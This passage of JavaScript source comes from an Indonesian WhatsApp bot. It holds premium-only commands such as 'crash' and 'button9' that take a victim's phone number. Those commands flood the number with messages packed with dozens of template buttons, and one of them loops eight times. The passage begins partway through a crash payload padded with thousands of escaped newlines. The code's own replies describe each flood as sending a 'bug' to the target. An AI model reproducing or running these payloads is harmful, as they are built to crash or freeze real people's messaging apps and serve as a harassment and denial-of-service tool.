n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}${place}${virtex2}`,
"fileLength": "112000",
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: msg.chat, quoted: vtext })
lexx.relayMessage(Pe, document.message, { messageId: document.key.id })
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break
case '🌷':
case '🔥':
case 'crash':
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} 62xxx\n Contoh : ${prefix+command} 6282328482747`)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break

case '🌷🌷':
case 'button9':
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} Nomor\nContoh: ${prefix+command} 6282748274828`)
let teksya = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
let jumlahm = "8"
for (let i = 0; i < jumlahm; i++) {
lexx.sendMessage(teksya, {
text: 'BUG BY NYX WANGSAP', 
templateButtons: [
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
